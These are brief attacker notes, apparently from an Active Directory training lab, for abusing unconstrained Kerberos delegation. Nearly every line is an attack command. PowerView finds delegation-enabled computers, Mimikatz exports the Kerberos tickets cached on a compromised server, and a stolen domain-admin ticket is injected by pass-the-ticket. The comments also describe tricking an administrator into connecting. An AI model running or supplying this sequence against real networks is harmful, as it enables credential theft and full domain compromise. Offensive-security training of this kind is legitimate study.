# DISCOVER DOMAIN COMPUTERS WHICH HAVE UNCONTRAINED DELEGATION ENABLED USING PowerView
Get-DomainComputer -UnConstrained


# COMPROMISE THE SERVER(s) WHERE UNCONSTRAINED DELEGATION IS ENABLED
# WE MUST TRICK OR WAIT FOR A DOMAIN ADMIN TO CONNECT A SERVICE ON APPSRV
# NOW, IF THE COMMAND IS RUN AGAIN:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# THE DA TOKEN COULD BE REUSED
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user575[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-dollarcorp.moneycorp.local.kirbi"'

